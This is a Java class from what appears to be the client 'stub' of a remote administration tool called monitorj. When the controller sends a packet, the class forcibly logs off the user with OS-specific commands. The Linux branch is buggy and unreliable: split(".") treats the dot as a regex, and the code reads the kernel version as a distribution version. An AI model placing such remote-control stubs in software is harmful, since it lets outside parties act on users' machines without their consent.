package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.util.OSCheck;

import java.io.IOException;

/**
 * Created by Josh on 4/07/2015.
 * TODO: Needs to be tested on Mac and Linux
 */
public class LogoffClientSystemTask extends PacketTask {

    public LogoffClientSystemTask() {
        super(Packets.LOGOFF_CLIENT_SYSTEM.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        String logoffCommand = null;
        OSCheck.OSType osType = OSCheck.getOperatingSystemType();
        switch (osType) {
            case Windows:
                logoffCommand = "shutdown -l -f";
                break;
            case MacOS: //Untested
                logoffCommand = "osascript -e 'tell application \"System Events\" to log out'";
                break;
            case Linux: //Untested
                String version = System.getProperty("os.version");
                String[] splitter = version.split(".");
                boolean laterVersion = Integer.parseInt(splitter[0]) > 11 && Integer.parseInt(splitter[1]) >= 10;
                logoffCommand = laterVersion ?
                        "gnome-session-quit" :
                        "dbus-send --session --type=method_call --print-reply --dest=org.gnome.SessionManager /org/gnome/SessionManager org.gnome.SessionManager.Logout uint32:1";
                break;
        }
        if(logoffCommand != null)
            Runtime.getRuntime().exec(logoffCommand);
    }
}
